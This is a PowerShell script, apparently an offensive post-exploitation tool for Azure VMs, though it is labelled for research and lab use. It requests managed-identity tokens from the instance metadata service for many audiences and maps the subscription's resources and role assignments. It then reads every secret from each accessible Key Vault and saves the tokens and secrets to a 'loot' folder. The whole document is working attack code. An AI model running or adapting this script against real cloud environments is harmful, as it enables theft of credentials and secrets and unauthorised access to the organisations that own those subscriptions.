<#
.SYNOPSIS
    Azure VM IMDS token collector and subscription reconnaissance (research / lab use).

.DESCRIPTION
    Executes from inside a VM with access to the Instance Metadata Service. Requests managed
    identity tokens (ARM and multiple audiences), writes JSON under %USERPROFILE%\Desktop\loot,
    and runs ARM/Key Vault/Graph checks as implemented below.

.NOTES
    Run from inside the VM. No dependencies.
#>

$o="$env:USERPROFILE\Desktop\loot"; md $o -Force|Out-Null; md "$o\tokens" -Force|Out-Null
$h=@{Metadata="true"}

# Token + decode
$arm=Invoke-RestMethod "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/" -Headers $h
$T=$arm.access_token; $arm|ConvertTo-Json|Out-File "$o\arm.json"
$p=$T.Split('.')[1]; $pad=4-($p.Length%4); if($pad-ne4){$p+='='*$pad}
$c=[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($p))|ConvertFrom-Json
$SUB=$c.xms_mirid.Split('/')[2]; $RG=$c.xms_mirid.Split('/')[4]; $VM=$c.xms_mirid.Split('/')[8]
$OID=$c.oid; $a=@{Authorization="Bearer $T"}
Write-Host "[+] $VM | SUB=$SUB | RG=$RG | OID=$OID | exp=$((Get-Date '1970-01-01').AddSeconds($c.exp))"

# Spray
$auds="management.azure.com/","vault.azure.net","graph.microsoft.com/","storage.azure.com/","cognitiveservices.azure.com/","api.loganalytics.io","database.windows.net/","servicebus.azure.net/","containerregistry.azure.net","app.vssps.visualstudio.com/","purview.azure.net/","iothubs.azure.net","outlook.office365.com/","monitor.azure.com/","cosmos.azure.com/","eventhubs.azure.net/","batch.core.windows.net/","dev.azuresynapse.net","analysis.windows.net/powerbi/api","azuredatabricks.net/","ml.azure.com/","managedhsm.azure.net","search.azure.com","communication.azure.com","digitaltwins.azure.net","aadrm.com","app-configuration.azure.net","graph.windows.net/"
$tk=@{}; foreach($u in $auds){try{$r=Invoke-RestMethod "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://$u" -Headers $h -EA Stop; $n=$u-replace'/',''; $tk[$n]=$r.access_token; $r|ConvertTo-Json|Out-File "$o\tokens\$n.json"; Write-Host "[+] $u" -Fore Green}catch{Write-Host "[-] $u" -Fore DarkGray}}
Write-Host "[+] $($tk.Count) tokens"

# Recon
$res=Invoke-RestMethod "https://management.azure.com/subscriptions/$SUB/resources?api-version=2021-04-01" -Headers $a
$res|ConvertTo-Json -Depth 5|Out-File "$o\resources.json"
$rgs=Invoke-RestMethod "https://management.azure.com/subscriptions/$SUB/resourceGroups?api-version=2021-04-01" -Headers $a
Write-Host "[+] $($rgs.value.Count) RGs | $($res.value.Count) resources"
$res.value|Group-Object type|Sort Count -Desc|%{Write-Host "  $($_.Count)x $($_.Name)"}

# RBAC
$rb=Invoke-RestMethod "https://management.azure.com/subscriptions/$SUB/providers/Microsoft.Authorization/roleAssignments?api-version=2022-04-01&`$filter=principalId eq '$OID'" -Headers $a
$rb|ConvertTo-Json -Depth 10|Out-File "$o\rbac.json"
foreach($r in $rb.value){$id=$r.properties.roleDefinitionId.Split('/')[-1]; try{$d=Invoke-RestMethod "https://management.azure.com/subscriptions/$SUB/providers/Microsoft.Authorization/roleDefinitions/$id`?api-version=2022-04-01" -Headers $a; Write-Host "  $($d.properties.roleName) @ $($r.properties.scope)" -Fore Cyan}catch{}}

# Targets
$kvs=$res.value|?{$_.type-eq"Microsoft.KeyVault/vaults"}; $snaps=$res.value|?{$_.type-eq"Microsoft.Compute/snapshots"}; $vms=$res.value|?{$_.type-eq"Microsoft.Compute/virtualMachines"}
Write-Host "[!] KeyVaults: $($kvs.Count) | Snapshots: $($snaps.Count) | VMs: $($vms.Count)" -Fore Red

# Vault dump
if($tk["vault.azure.net"]){$vh=@{Authorization="Bearer $($tk['vault.azure.net'])"}; foreach($kv in $kvs){$n=$kv.name; $s=Invoke-RestMethod "https://$n.vault.azure.net/secrets?api-version=7.4" -Headers $vh; Write-Host "[+] Vault $n : $($s.value.Count) secrets" -Fore Red; foreach($x in $s.value){$sn=$x.id.Split('/')[-1]; try{$sv=Invoke-RestMethod "https://$n.vault.azure.net/secrets/$sn`?api-version=7.4" -Headers $vh; $sv|ConvertTo-Json|Out-File "$o\secret_$sn.json"; Write-Host "  $sn -> saved" -Fore Green}catch{}}}}

# VM states
foreach($v in $vms){$vn=$v.name; $vr=$v.id.Split('/')[4]; try{$iv=Invoke-RestMethod "https://management.azure.com/subscriptions/$SUB/resourceGroups/$vr/providers/Microsoft.Compute/virtualMachines/$vn/instanceView?api-version=2024-03-01" -Headers $a; $st=($iv.statuses|?{$_.code-like"PowerState*"}).displayStatus; Write-Host "  $vn : $st" -Fore $(if($st-eq"VM running"){"Green"}else{"DarkGray"})}catch{}}

# Graph test
if($tk["graph.microsoft.com"]){$gh=@{Authorization="Bearer $($tk['graph.microsoft.com'])"}; try{$sp=Invoke-RestMethod "https://graph.microsoft.com/v1.0/servicePrincipals/$OID" -Headers $gh; Write-Host "[+] Graph self: $($sp.displayName)" -Fore Green}catch{Write-Host "[-] Graph: blocked" -Fore DarkGray}; try{Invoke-RestMethod "https://graph.microsoft.com/v1.0/users?`$top=1" -Headers $gh; Write-Host "[+] Graph users: accessible" -Fore Red}catch{Write-Host "[-] Graph users: denied (wids trap)" -Fore DarkGray}}

Write-Host "`n[+] Loot saved to $o" -Fore Green
